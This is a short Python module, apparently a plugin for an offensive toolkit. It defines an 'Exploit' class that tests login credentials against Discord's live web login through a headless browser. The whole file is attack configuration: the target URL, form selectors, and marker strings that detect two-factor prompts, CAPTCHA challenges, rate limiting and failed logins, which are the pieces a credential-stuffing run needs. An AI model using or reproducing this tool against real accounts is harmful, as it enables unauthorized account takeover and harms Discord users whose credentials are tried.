"""Discord Credential Tester — headless-browser login flow."""
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester


class Exploit(BaseSocialLoginTester):
    name = "Discord Credential Tester"
    description = "Tests credentials against Discord's web login via a headless browser."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "discord"
    browser_login_url = "https://discord.com/login"
    username_selector = "input[name=email]"
    password_selector = "input[name=password]"
    post_load_delay_ms = 9000
    page_load_timeout_ms = 30000
    browser_login_paths = ("/login", "/login-required")
    twofa_markers = (
        "two-factor", "two factor", "2fa", "verification code", "enter the code",
        "authenticator app",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "are you a robot",
        "hcaptcha", "verify you're human", "are you human", "you're not a robot",
        "confirm you're not a robot", "wait! are you human",
    )
    rate_markers = (
        "too many attempts", "try again later", "rate limit", "rate-limited",
        "slow down", "you are being rate",
    )
    invalid_markers = (
        "login error", "invalid login", "invalid password", "incorrect password",
        "wrong password", "password is incorrect", "account not found",
        "no account found", "doesn't exist",
    )
